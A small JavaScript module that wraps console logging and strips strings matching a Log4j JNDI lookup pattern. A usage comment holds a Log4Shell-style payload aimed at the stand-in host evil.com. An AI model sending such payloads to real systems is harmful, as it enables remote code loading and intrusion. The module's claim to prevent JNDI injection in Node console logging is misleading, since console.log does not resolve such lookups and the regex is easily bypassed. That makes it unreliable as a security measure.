// A safe wrapper for console.log to prevent Log4j JNDI injection.
// For production, consider using a structured logging library.

const JNDI_REGEX = /\$\{jndi:[^}]+\}/gi;

function sanitizeMessage(msg) {
  if (typeof msg === 'string') {
    return msg.replace(JNDI_REGEX, '[SANITIZED]');
  }
  return msg;
}

const safeLogger = {
  log: function(...args) {
    const sanitized = args.map(arg => sanitizeMessage(arg));
    console.log(...sanitized);
  },
  info: function(...args) {
    const sanitized = args.map(arg => sanitizeMessage(arg));
    console.info(...sanitized);
  },
  warn: function(...args) {
    const sanitized = args.map(arg => sanitizeMessage(arg));
    console.warn(...sanitized);
  },
  error: function(...args) {
    const sanitized = args.map(arg => sanitizeMessage(arg));
    console.error(...sanitized);
  },
  debug: function(...args) {
    const sanitized = args.map(arg => sanitizeMessage(arg));
    console.debug(...sanitized);
  }
};

// Usage example:
// safeLogger.info('User input: ${jndi:ldap://evil.com/a}');
// Output: 'User input: [SANITIZED]'

module.exports = safeLogger;